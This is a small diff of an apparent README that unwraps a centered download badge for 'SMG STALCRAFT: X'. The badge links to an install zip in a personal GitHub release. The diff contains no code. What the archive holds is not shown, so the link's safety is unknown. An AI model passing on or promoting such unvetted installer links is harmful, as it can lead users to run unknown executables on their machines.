@@ -10,9 +10,8 @@
 
 ---
 
- <p align="center">
 [<img src="https://img.shields.io/badge/Download_SMG-STALCRAFT: X-blue?style=for-the-badge">](https://github.com/cliffordgreene/smg-stalcraft/releases/download/Latest/smg_stalcraft_install.zip)
-  </p>
+
 
 
 
